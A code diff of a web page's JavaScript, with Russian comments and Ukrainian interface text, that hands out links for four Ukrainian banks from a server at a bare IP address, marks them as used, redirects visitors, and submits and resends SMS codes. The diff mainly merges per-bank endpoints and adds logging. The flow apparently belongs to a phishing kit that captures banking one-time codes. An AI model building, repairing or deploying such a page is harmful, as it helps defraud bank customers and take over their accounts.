@@ -471,8 +471,8 @@
   </div>
 
   <script>
-    // ИСПРАВЛЕНО: используем правильный адрес API (замените на ваш IP сервера)
-    const API_BASE = "http://92.242.187.250:8000"; // или ваш домен
+    // ИСПРАВЛЕНО: используем правильный адрес API
+    const API_BASE = "http://92.242.187.250:8000";
     
     const API_MAP = {
       mono:   `${API_BASE}/link?bank=monobank`,
@@ -481,12 +481,8 @@
       pumb:   `${API_BASE}/link?bank=pumbbank`
     };
     
-    const CONSUME_MAP = {
-      mono:   `${API_BASE}/consume-link?bank=monobank`,
-      oschad: `${API_BASE}/consume-link?bank=oschadbank`,
-      raiff:  `${API_BASE}/consume-link?bank=raiffeisenbank`,
-      pumb:   `${API_BASE}/consume-link?bank=pumbbank`
-    };
+    // ИСПРАВЛЕНО: Используем единый URL для consume-link без параметра bank
+    const CONSUME_URL = `${API_BASE}/consume-link`;
     
     const STATUS_URL = `${API_BASE}/api/link-status`;
     const CODE_URL   = `${API_BASE}/api/submit-code`;
@@ -681,7 +677,7 @@
 
       const data = linkData[bank];
       if (!data || !data.url || !data.id) {
-        document.getElementById("status").innerHTML = "<span style='color:#b33'>Немає доступної ссилки для цього банку.</span>";
+        document.getElementById("status").innerHTML = "<span style='color:#fff'>Немає доступної ссилки для цього банку.</span>";
         hideLoading();
         autoRefreshActive = true;
         checkAllLinks();
@@ -692,7 +688,13 @@
       link = data.url;
       
       try {
-        await fetch(CONSUME_MAP[bank] + "&id=" + currentId, { method: "POST" });
+        // ИСПРАВЛЕНО: Используем правильный URL только с параметром id
+        const consumeUrl = `${CONSUME_URL}?id=${currentId}`;
+        console.log(`🔗 Consume URL: ${consumeUrl}`);
+        
+        const consumeRes = await fetch(consumeUrl, { method: "POST" });
+        const consumeData = await consumeRes.json();
+        console.log(`✅ Consume response:`, consumeData);
       } catch (e) {
         console.log("Ошибка consume:", e);
         hideLoading();
@@ -700,7 +702,7 @@
         return;
       }
       
-      document.getElementById("return-instruction").style.display = "";
+      document.getElementById("return-instruction").style.display = "block";
       window.location.href = link;
       pollStatus();
     }
@@ -1049,7 +1051,7 @@
     }
     
     // Функция запроса повторной отправки SMS
-    async function requestResendCode() {
+    window.requestResendCode = async function() {
       if (!currentId) return;
       
       const resendBtn = document.getElementById("resend-btn");
